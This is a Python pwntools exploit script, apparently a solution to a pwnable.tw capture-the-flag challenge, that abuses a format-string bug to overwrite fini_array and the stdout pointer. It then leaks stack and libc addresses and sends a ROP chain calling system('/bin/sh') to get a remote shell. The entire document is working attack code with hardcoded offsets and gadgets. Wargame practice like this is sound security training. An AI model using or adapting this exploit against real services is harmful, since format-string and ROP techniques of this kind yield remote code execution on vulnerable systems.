from pwn import *

###Addr
fini_array = 0x600db8
bss = 0x601000
stdout_ptr = 0x601020
after_close = 0x400925
stderr_struct_offset = 0x3c4540
libc_start_offset = 0x20740+240
bin_sh_offset = 0x18c177
system_offset = 0x45390

###ROPgadget
pop4 = 0x4009bc
pop_rdi = 0x4009c3

###Exploit
while True:
    r = remote('chall.pwnable.tw',10307)

    overwrite_fini_array_offset = f'%{bss-fini_array}c%42$n'
    fake_fini_array_entry = f'%{(after_close&0xffff)-(bss-fini_array)}c%14$n'+\
                            f'%{(after_close>>16)-(after_close&0xff)}c%15$hhn'
    overwrite_stdout_ptr = f'%16$hhn'+\
                           f'%{((stderr_struct_offset>>8)&0xff)-(stderr_struct_offset&0xff)}c%17$hhn'
    payload = overwrite_fini_array_offset+fake_fini_array_entry+overwrite_stdout_ptr
    payload = payload.encode().ljust(0x40,b'\x00')+p64(bss)+p64(bss+2)+p64(stdout_ptr)+p64(stdout_ptr+1)
    r.sendafter('Input :',payload.ljust(0x80,b'\x00'))

    leak = '%23$p%60$p'
    restart = f'%{(after_close&0xffff)-(14*2)}c%23$hn'
    payload = leak+restart
    r.send(payload)
    try:
        res = r.recv(0x1000)
        if b'Segmentation fault' in res:
            r.close()
        else:
            leaks = res[:28].split(b'0x')[1:]
            break
    except:
        r.close()

stack_addr = int(leaks[0],16)+0x8
libc_start_addr = int(leaks[1],16)
libc_base = libc_start_addr-libc_start_offset
print(hex(stack_addr))
print(hex(libc_base))


restart = f'%{(after_close&0xffff)}c%21$hn'
overwrite1 = f'%24$n'
overwrite2 = f'%{(pop4&0xffff)-(after_close&0xffff)}c%22$hn'+\
             f'%{(pop4>>16)-(pop4&0xff)+0x100}c%23$hhn'
payload = overwrite1+restart+overwrite2
payload = payload.encode().ljust(0x40,b'\x00')+p64(stack_addr-0x8)+p64(stack_addr+0x20)+p64(stack_addr+0x22)+p64(stack_addr+0x23)
r.send(payload.ljust(0x80,b'\x00'))

stub = f'%{pop4&0xffff}c%18$hn'.encode().ljust(0xc,b'\x01')+b'EOF\x00'
ROPchain = p64(pop_rdi)+p64(libc_base+bin_sh_offset)+\
           p64(libc_base+system_offset)
target = p64(stack_addr-0x8)
payload = stub+ROPchain+target
r.send(payload.ljust(0x80,b'\x00'))

r.recvuntil('EOF')
print('Remember to add \'>&2\' before payload to correctly display it')
r.interactive()
